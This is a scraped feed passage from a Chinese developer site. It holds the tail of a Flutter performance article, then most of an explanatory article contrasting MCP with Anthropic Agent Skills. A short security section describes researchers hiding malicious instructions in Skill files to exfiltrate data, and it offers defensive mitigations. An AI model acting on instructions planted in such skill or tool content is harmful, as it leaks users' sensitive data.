      <span class="hljs-keyword">if</span> (frameInterval &gt; <span class="hljs-number">33.34</span>) { 
        _droppedFrames++;
      }
      
      setState(() {
        _fps = fps;
      });
    }
  }
  
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> Stack(
      children: [
        widget.child,
        <span class="hljs-keyword">if</span> (kDebugMode) <span class="hljs-comment">// 只在调试模式显示</span>
          Positioned(
            top: <span class="hljs-number">40</span>,
            right: <span class="hljs-number">10</span>,
            child: Container(
              padding: <span class="hljs-keyword">const</span> EdgeInsets.all(<span class="hljs-number">8</span>),
              color: _getFPSColor(),
              child: Text(
                <span class="hljs-string">'FPS: <span class="hljs-subst">${_fps.toStringAsFixed(<span class="hljs-number">1</span>)}</span>\n'</span>
                <span class="hljs-string">'掉帧: <span class="hljs-subst">$_droppedFrames</span>'</span>,
                style: <span class="hljs-keyword">const</span> TextStyle(color: Colors.white),
              ),
            ),
          ),
      ],
    );
  }
  
  Color _getFPSColor() {
    <span class="hljs-keyword">if</span> (_fps &gt;= <span class="hljs-number">55</span>) <span class="hljs-keyword">return</span> Colors.green;
    <span class="hljs-keyword">if</span> (_fps &gt;= <span class="hljs-number">30</span>) <span class="hljs-keyword">return</span> Colors.orange;
    <span class="hljs-keyword">return</span> Colors.red;
  }
}
</code></pre>
<h3 data-id="heading-27">六、性能优化优先级</h3>
<p>基于影响范围和实施难度等多重因素，建议性能优化的优先级顺序如下：</p>





























































<table><thead><tr><th>优先级</th><th>优化方向</th><th>影响范围</th><th>实施难度</th><th>推荐工具</th></tr></thead><tbody><tr><td><strong>P0</strong></td><td>修复内存泄漏</td><td>整个应用</td><td>低</td><td>DevTools, LeakCanary</td></tr><tr><td><strong>P0</strong></td><td>优化启动时间</td><td>首次体验</td><td>中</td><td>Flutter Performance</td></tr><tr><td><strong>P1</strong></td><td>优化列表滚动</td><td>核心功能</td><td>中</td><td>Performance Overlay</td></tr><tr><td><strong>P1</strong></td><td>优化包体积</td><td>下载率</td><td>中</td><td>Analyze Size</td></tr><tr><td><strong>P2</strong></td><td>优化动画流畅度</td><td>用户体验</td><td>高</td><td>Flutter Inspector</td></tr><tr><td><strong>P2</strong></td><td>优化构建性能</td><td>开发体验</td><td>低</td><td>Dart Analyzer</td></tr><tr><td><strong>P3</strong></td><td>优化渲染管线</td><td>特定场景</td><td>高</td><td>Custom RenderObject</td></tr></tbody></table>
<h3 data-id="heading-28">总结</h3>
<p>至此性能优化的知识点就全部介绍完了，其核心：</p>
<ul>
<li>需要从架构设计阶段开始考虑</li>
<li>不同的应用场景需要不同的优化策略</li>
<li>数据驱动</li>
<li>所有优化都要服务于用户体验</li>
<li>性能优化是持续的过程</li>
</ul>
<p><strong>过早优化是万恶之源，但不优化是用户体验的灾难。</strong> 优化在于正确的时间，用正确的方法，优化正确的地方。</p>
<hr/>
<p><strong>如果觉得这篇文章有帮助，别忘了一键三连支持一下！有任何问题或建议，欢迎在评论区交流讨论！</strong>
<strong>转载请注明出处~~~</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[别搞混了！MCP 和 Agent Skill 到底有什么区别？]]></title>    <link>https://juejin.cn/post/7584057497205817387</link>    <guid>https://juejin.cn/post/7584057497205817387</guid>    <pubDate>2025-12-16T06:50:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584057497205817387" data-draft-id="7584057497205768235" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="别搞混了！MCP 和 Agent Skill 到底有什么区别？"/> <meta itemprop="keywords" content="AIGC,AI编程,Agent"/> <meta itemprop="datePublished" content="2025-12-16T06:50:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="也无风雨也雾晴"/> <meta itemprop="url" content="https://juejin.cn/user/2175258804632332"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            别搞混了！MCP 和 Agent Skill 到底有什么区别？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2175258804632332/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    也无风雨也雾晴
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T06:50:42.000Z" title="Tue Dec 16 2025 06:50:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读14分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">MCP 与 Skill 深度对比：AI Agent 的两种扩展哲学</h2>
<p>用 AI Agent 工具（Claude Code、Cursor、Windsurf 等）的时候，经常会遇到两个概念：</p>
<ul>
<li>MCP（Model Context Protocol）</li>
<li>Skill（Agent Skill）</li>
</ul>
<p>它们看起来都是"扩展 AI 能力"的方式，但具体有什么区别？为什么需要两套机制？什么时候该用哪个？</p>
<p>这篇文章会从设计哲学、技术架构、使用场景三个维度，把这两个概念彻底讲清楚。</p>
<h3 data-id="heading-1">一句话区分</h3>
<p>先给个简单的定位：</p>
<blockquote>
<p><strong>MCP 解决"连接"问题：让 AI 能访问外部世界</strong>
<strong>Skill 解决"方法论"问题：教 AI 怎么做某类任务</strong></p>
</blockquote>
<p>用 Anthropic 官方的说法：</p>
<blockquote>
<p>"MCP connects Claude to external services and data sources. Skills provide procedural knowledge—instructions for how to complete specific tasks or workflows."</p>
</blockquote>
<p>打个比方：MCP 是 AI 的"手"（能触碰外部世界），Skill 是 AI 的"技能书"（知道怎么做某件事）。</p>
<p>你需要两者配合：MCP 让 AI 能连接数据库，Skill 教 AI 怎么分析查询结果。</p>
<h3 data-id="heading-2">MCP：AI 应用的 USB-C 接口</h3>
<h4 data-id="heading-3">MCP 是什么</h4>
<p>MCP（Model Context Protocol）是 Anthropic 在 2024 年 11 月发布的<strong>开源协议</strong>，用于标准化 AI 应用与外部系统的交互方式。</p>
<p>官方的比喻是"AI 应用的 USB-C 接口"——就像 USB-C 提供了一种通用的方式连接各种设备，MCP 提供了一种通用的方式连接各种工具和数据源。</p>
<p><strong>关键点：MCP 不是 Claude 专属的。</strong></p>
<p>它是一个开放协议，理论上任何 AI 应用都可以实现。截至 2025 年初，已经被多个平台采用：</p>
<ul>
<li><strong>Anthropic</strong>: Claude Desktop、Claude Code</li>
<li><strong>OpenAI</strong>: ChatGPT、Agents SDK、Responses API</li>
<li><strong>Google</strong>: Gemini SDK</li>
<li><strong>Microsoft</strong>: Azure AI Services</li>
<li><strong>开发工具</strong>: Zed、Replit、Codeium、Sourcegraph</li>
</ul>
<p>到 2025 年 2 月，已经有超过 1000 个开源 MCP 连接器。</p>
<h4 data-id="heading-4">MCP 的架构</h4>
<p>MCP 基于 <strong>JSON-RPC 2.0</strong> 协议，采用<strong>客户端-主机-服务器</strong>（Client-Host-Server）架构：</p>
<pre><code class="hljs language-scss" lang="scss">┌─────────────────────────────────────────────────────────┐
│                        Host                              │
│              (Claude Desktop / Cursor)                   │
│                                                          │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐      │
│  │   Client    │  │   Client    │  │   Client    │      │
│  │  (GitHub)   │  │ (Postgres)  │  │  (Sentry)   │      │
│  └──────┬──────┘  └──────┬──────┘  └──────┬──────┘      │
└─────────┼────────────────┼────────────────┼─────────────┘
          │                │                │
          ▼                ▼                ▼
    ┌───────────┐    ┌───────────┐    ┌───────────┐
    │MCP Server │    │MCP Server │    │MCP Server │
    │ (GitHub)  │    │(Postgres) │    │ (Sentry)  │
    └───────────┘    └───────────┘    └───────────┘
</code></pre>
<ul>
<li><strong>Host</strong>：用户直接交互的应用（Claude Desktop、Cursor、Windsurf）</li>
<li><strong>Client</strong>：Host 应用中管理与特定 Server 通信的组件</li>
<li><strong>Server</strong>：连接外部系统的桥梁（数据库、API、本地文件等）</li>
</ul>
<h4 data-id="heading-5">MCP 的三个核心原语</h4>
<p>MCP 定义了三种 Server 可以暴露的原语：</p>
<h5 data-id="heading-6">1. Tools（工具）—— 模型控制</h5>
<p>可执行的函数，AI 可以调用来执行操作。</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"query_database"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"description"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Execute SQL query on the database"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"parameters"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"object"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"properties"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"sql"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"string"</span> <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>AI 决定什么时候调用这些工具。比如用户问"这个月的收入是多少"，AI 判断需要查数据库，就会调用 <code>query_database</code> 工具。</p>
<h5 data-id="heading-7">2. Resources（资源）—— 应用控制</h5>
<p>数据源，为 AI 提供上下文信息。</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"uri"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"file:///Users/project/README.md"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Project README"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"mimeType"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"text/markdown"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>资源由应用控制何时加载。用户可以通过 <code>@</code> 引用资源，类似于引用文件。</p>
<h5 data-id="heading-8">3. Prompts（提示）—— 用户控制</h5>
<p>预定义的提示模板，帮助结构化与 AI 的交互。</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"code_review"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"description"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Review code for bugs and security issues"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"arguments"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-punctuation">{</span> <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"code"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"required"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span> <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>用户显式触发这些提示，类似于 Slash Command。</p>
<h4 data-id="heading-9">MCP 与 Function Calling 的关系</h4>
<p>很多人会问：MCP 和 OpenAI 的 Function Calling、Anthropic 的 Tool Use 有什么区别？</p>
<p><strong>Function Calling</strong> 是 LLM 的能力——把自然语言转换成结构化的函数调用请求。LLM 本身<strong>不执行</strong>函数，只是告诉你"应该调用什么函数，参数是什么"。</p>
<p><strong>MCP</strong> 是在 Function Calling 之上的<strong>协议层</strong>——它标准化了"函数在哪里、怎么调用、怎么发现"。</p>
<p>两者的关系：</p>
<pre><code class="hljs language-vbscript" lang="vbscript">用户输入 → LLM (<span class="hljs-keyword">Function</span> Calling) → <span class="hljs-string">"需要调用 query_database"</span>
                                           ↓
                                    MCP Protocol
                                           ↓
                                    MCP <span class="hljs-built_in">Server</span> 执行
                                           ↓
                                    返回结果给 LLM
</code></pre>
<p><strong>Function Calling 解决"决定做什么"，MCP 解决"怎么做到"。</strong></p>
<h4 data-id="heading-10">MCP 的传输方式</h4>
<p>MCP 支持两种主要的传输方式：</p>




















<table><thead><tr><th>传输方式</th><th>适用场景</th><th>说明</th></tr></thead><tbody><tr><td><strong>Stdio</strong></td><td>本地进程</td><td>Server 在本地机器运行，适合需要系统级访问的工具</td></tr><tr><td><strong>HTTP/SSE</strong></td><td>远程服务</td><td>Server 在远程运行，适合云服务（GitHub、Sentry、Notion）</td></tr></tbody></table>
<p>大部分云服务用 HTTP，本地脚本和自定义工具用 Stdio。</p>
<h4 data-id="heading-11">MCP 的代价</h4>
<p>MCP 不是免费的午餐，它有明显的成本：</p>
<p><strong>1. Token 消耗大</strong></p>
<p>每个 MCP Server 都会占用上下文空间。每次对话开始，MCP Client 需要告诉 LLM "你有这些工具可用"，这些工具定义会消耗大量 Token。</p>
<p>连接多个 MCP Server 后，光是工具定义可能就占用了上下文窗口的很大一部分。社区观察到：</p>
<blockquote>
<p>"We're seeing a lot of MCP developers even at enterprise build MCP servers that expose way too much, consuming the entire context window and leading to hallucination."</p>
</blockquote>
<p><strong>2. 需要维护连接</strong></p>
<p>MCP Server 是持久连接的外部进程。Server 挂了、网络断了、认证过期了，都会影响 AI 的能力。</p>
<p><strong>3. 安全风险</strong></p>
<p>Anthropic 官方警告：</p>
<blockquote>
<p>"Use third party MCP servers at your own risk - Anthropic has not verified the correctness or security of all these servers."</p>
</blockquote>
<p>特别是能获取外部内容的 MCP Server（比如网页抓取），可能带来 prompt injection 风险。</p>
<h4 data-id="heading-12">MCP 的价值</h4>
<p>尽管有这些代价，MCP 的价值在于<strong>标准化和可复用性</strong>：</p>
<ul>
<li><strong>一次实现，到处使用</strong>：同一个 GitHub MCP Server 可以在 Claude Desktop、Cursor、Windsurf 中使用</li>
<li><strong>动态发现</strong>：AI 可以在运行时发现有哪些工具可用，而不是写死在代码里</li>
<li><strong>供应商无关</strong>：不依赖特定的 LLM 提供商</li>
</ul>
<h3 data-id="heading-13">Skill：上下文工程的渐进式公开</h3>
<h4 data-id="heading-14">Skill 是什么</h4>
<p>Skill（全称 Agent Skill）是 Anthropic 在 2025 年 10 月发布的特性。官方定义：</p>
<blockquote>
<p>"Skills are organized folders of instructions, scripts, and resources that agents can discover and load dynamically to perform better at specific tasks."</p>
</blockquote>
<p>翻译一下：Skill 是一个文件夹，里面放着指令、脚本和资源，AI 会根据需要自动发现和加载。</p>
<p><strong>Skill 在架构层级上和 MCP 不同。</strong></p>
<p>用 Anthropic 的话说：</p>
<blockquote>
<p>"Skills are at the prompt/knowledge layer, whereas MCP is at the integration layer."</p>
</blockquote>
<p>Skill 是"提示/知识层"，MCP 是"集成层"。两者解决不同层面的问题。</p>
<h4 data-id="heading-15">Skill 的核心设计：渐进式信息公开</h4>
<p>Skill 最精妙的设计是<strong>渐进式信息公开</strong>（Progressive Disclosure）。这是 Anthropic 在上下文工程（Context Engineering）领域的重要实践。</p>
<p>官方的比喻：</p>
<blockquote>
<p>"Like a well-organized manual that starts with a table of contents, then specific chapters, and finally a detailed appendix."</p>
</blockquote>
<p>就像一本组织良好的手册：先看目录，再翻到相关章节，最后查阅附录。</p>
<p>Skill 分三层加载：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TD
    subgraph L1["第 1 层：元数据（始终加载）"]
        A[Skill 名称 + 描述]
        B["约 100 tokens"]
    end

    subgraph L2["第 2 层：核心指令（按需加载）"]
        C[SKILL.md 完整内容]
        D["通常 &lt; 5k tokens"]
    end

    subgraph L3["第 3+ 层：支持文件（深度按需）"]
        E[reference.md]
        F[scripts/helper.py]
        G[templates/...]
    end

    L1 --&gt; |"Claude 判断相关"| L2
    L2 --&gt; |"需要更多信息"| L3

    style L1 fill:#d4edda,stroke:#28a745
    style L2 fill:#fff3cd,stroke:#ffc107
    style L3 fill:#cce5ff,stroke:#0d6efd
</code></pre>
<p><strong>这个设计的好处是什么？</strong></p>
<p>传统方式（比如 MCP）在会话开始时就把所有信息加载到上下文。如果你有 10 个 MCP Server，每个暴露 5 个工具，那就是 50 个工具定义——可能消耗数千甚至上万 Token。</p>
<p>Skill 的渐进式加载让你可以有几十个 Skill，但同时只加载一两个。<strong>上下文效率大幅提升。</strong></p>
<p>用官方的话说：</p>
<blockquote>
<p>"This means that the amount of context that can be bundled into a skill is effectively unbounded."</p>
</blockquote>
<p>理论上，单个 Skill 可以包含无限量的知识——因为只有需要的部分才会被加载。</p>
<h4 data-id="heading-16">上下文工程：Skill 背后的思想</h4>
<p>Skill 是 Anthropic "上下文工程"（Context Engineering）理念的产物。官方对此有专门的阐述：</p>
<blockquote>
<p>"At Anthropic, we view context engineering as the natural progression of prompt engineering. Prompt engineering refers to methods for writing and organizing LLM instructions for optimal outcomes. Context engineering refers to the set of strategies for curating and maintaining the optimal set of tokens (information) during LLM inference."</p>
</blockquote>
<p>简单说：</p>
<ul>
<li><strong>Prompt Engineering</strong>：怎么写好提示词</li>
<li><strong>Context Engineering</strong>：怎么管理上下文窗口里的信息</li>
</ul>
<p>LLM 的上下文窗口是有限的（即使是 200k 窗口，也会被大量信息撑爆）。Context Engineering 的核心问题是：<strong>在有限的窗口里，放什么信息能让 AI 表现最好？</strong></p>
<p>Skill 的渐进式加载就是 Context Engineering 的具体实践——只加载当前任务需要的信息，让每一个 Token 都发挥最大价值。</p>
<h4 data-id="heading-17">Skill 的触发机制</h4>
<p>Skill 是<strong>自动触发</strong>的，这是它和 Slash Command 的关键区别。</p>
<p>工作流程：</p>
<ol>
<li><strong>扫描阶段</strong>：Claude 读取所有 Skill 的元数据（名称 + 描述）</li>
<li><strong>匹配阶段</strong>：将用户请求与 Skill 描述进行语义匹配</li>
<li><strong>加载阶段</strong>：如果匹配成功，加载完整的 SKILL.md</li>
<li><strong>执行阶段</strong>：按照 Skill 里的指令执行任务，按需加载支持文件</li>
</ol>
<p>用户不需要显式调用。比如你有一个 <code>code-review</code> Skill，用户说"帮我 review 这段代码"，Claude 会自动匹配并加载。</p>
<p><strong>Skill 的本质是什么？</strong></p>
<p>技术上，Skill 是一个<strong>元工具</strong>（Meta-tool）：</p>
<blockquote>
<p>"The Skill tool is a meta-tool that manages all skills. Traditional tools like Read, Bash, or Write execute discrete actions and return immediate results. Skills operate differently—rather than performing actions directly, they inject specialized instructions into the conversation history and dynamically modify Claude's execution environment."</p>
</blockquote>
<p>Skill 不是执行具体动作，而是<strong>注入指令</strong>到对话历史中，动态修改 Claude 的执行环境。</p>
<h4 data-id="heading-18">Skill 的文件结构</h4>
<p>一个标准的 Skill 长这样：</p>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-keyword">my</span>-skill/
├── SKILL.md              <span class="hljs-comment"># 必需：元数据 + 主要指令</span>
├── reference.md          <span class="hljs-comment"># 可选：详细参考文档</span>
├── examples.md           <span class="hljs-comment"># 可选：使用示例</span>
├── scripts/
│   └── helper.py         <span class="hljs-comment"># 可选：可执行脚本</span>
└── templates/
    └── template.txt      <span class="hljs-comment"># 可选：模板文件</span>
</code></pre>
<p><code>SKILL.md</code> 是核心，必须包含 YAML 格式的元数据：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-meta">---</span>
<span class="hljs-attr">name:</span> <span class="hljs-string">code-review</span>
<span class="hljs-attr">description:</span> <span class="hljs-string">&gt;
  Review code for bugs, security issues, and style violations.
  Use when asked to review code, check for bugs, or audit PRs.
</span><span class="hljs-meta">---
</span>
<span class="hljs-comment"># Code Review Skill</span>

<span class="hljs-comment">## Instructions</span>

<span class="hljs-string">When</span> <span class="hljs-string">reviewing</span> <span class="hljs-string">code,</span> <span class="hljs-attr">follow these steps:</span>

<span class="hljs-number">1</span><span class="hljs-string">.</span> <span class="hljs-string">First</span> <span class="hljs-string">check</span> <span class="hljs-string">for</span> <span class="hljs-string">security</span> <span class="hljs-string">vulnerabilities...</span>
<span class="hljs-number">2</span><span class="hljs-string">.</span> <span class="hljs-string">Then</span> <span class="hljs-string">check</span> <span class="hljs-string">for</span> <span class="hljs-string">performance</span> <span class="hljs-string">issues...</span>
<span class="hljs-number">3</span><span class="hljs-string">.</span> <span class="hljs-string">Finally</span> <span class="hljs-string">check</span> <span class="hljs-string">for</span> <span class="hljs-string">code</span> <span class="hljs-string">style...</span>
</code></pre>
<p><strong>关键字段：</strong></p>
<ul>
<li><code>name</code>：Skill 的唯一标识，小写字母 + 数字 + 连字符，最多 64 字符</li>
<li><code>description</code>：描述做什么、什么时候用，最多 1024 字符</li>
</ul>
<p><code>description</code> 的质量直接决定 Skill 能不能被正确触发。</p>
<h4 data-id="heading-19">Skill 的安全考虑</h4>
<p>Skill 有一个潜在的安全问题：<strong>Prompt Injection</strong>。</p>
<p>研究人员发现：</p>
<blockquote>
<p>"Although Agent Skills can be a very useful tool, they are fundamentally insecure since they enable trivially simple prompt injections. Researchers demonstrated how to hide malicious instructions in long Agent Skill files and referenced scripts to exfiltrate sensitive data."</p>
</blockquote>
<p>因为 Skill 本质上是注入指令，恶意的 Skill 可以在长文件中隐藏恶意指令，窃取敏感数据。</p>
<p><strong>应对措施：</strong></p>
<ol>
<li><strong>只使用可信来源的 Skill</strong></li>
<li><strong>审查 Skill 中的脚本</strong></li>
<li><strong>使用 <code>allowed-tools</code> 限制 Skill 的能力范围</strong></li>
</ol>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-meta">---</span>
<span class="hljs-attr">name:</span> <span class="hljs-string">safe-file-reader</span>
<span class="hljs-attr">description:</span> <span class="hljs-string">Read</span> <span class="hljs-string">and</span> <span class="hljs-string">analyze</span> <span class="hljs-string">files</span> <span class="hljs-string">without</span> <span class="hljs-string">making</span> <span class="hljs-string">changes</span>
<span class="hljs-attr">allowed-tools:</span> <span class="hljs-string">Read,</span> <span class="hljs-string">Grep,</span> <span class="hljs-string">Glob</span>  <span class="hljs-comment"># 只允许读操作</span>
<span class="hljs-meta">---
</span></code></pre>
<h4 data-id="heading-20">Skill 的平台支持</h4>
<p>Agent Skills 目前支持：</p>
<ul>
<li>Claude.ai（Pro、Max、Team、Enterprise）</li>
<li>Claude Code</li>
<li>Claude Agent SDK</li>
<li>Claude Developer Platform</li>
</ul>
<p>需要注意的是，<strong>Skill 目前是 Anthropic 生态专属</strong>的，不像 MCP 是跨平台的开放协议。</p>
<h3 data-id="heading-21">MCP vs Skill：架构层级对比</h3>
<p>现在我们可以从架构层级来理解两者的区别：</p>
<pre><code class="hljs language-arduino" lang="arduino">┌─────────────────────────────────────────────────────────┐
│                     用户请求                             │
└────────────────────────┬────────────────────────────────┘
                         ▼
┌─────────────────────────────────────────────────────────┐
│                  提示/知识层 (Skill)                     │
│                                                          │
│   Skill 注入专业知识和工作流程                           │
│   <span class="hljs-string">"怎么做某类任务"</span>                                       │
└────────────────────────┬────────────────────────────────┘
                         ▼
┌─────────────────────────────────────────────────────────┐
│                    LLM 推理层                            │
│                                                          │
│   Claude / GPT / Gemini 等                              │
│   理解请求，决定需要什么工具                             │
└────────────────────────┬────────────────────────────────┘
                         ▼
┌─────────────────────────────────────────────────────────┐
│                  集成层 (MCP)                            │
│                                                          │
│   MCP 连接外部系统                                       │
│   <span class="hljs-string">"能访问什么工具和数据"</span>                                 │
└────────────────────────┬────────────────────────────────┘
                         ▼
┌─────────────────────────────────────────────────────────┐
│                   外部世界                               │
│                                                          │
│   数据库、API、文件系统、第三方服务                      │
└─────────────────────────────────────────────────────────┘
</code></pre>
<p><strong>Skill 在上层（知识层），MCP 在下层（集成层）。</strong></p>
<p>两者不是替代关系，而是互补关系。你可以：</p>
<ul>
<li>用 MCP 连接 GitHub</li>
<li>用 Skill 教 AI 如何按照团队规范做 Code Review</li>
</ul>
<h3 data-id="heading-22">详细对比表</h3>

































































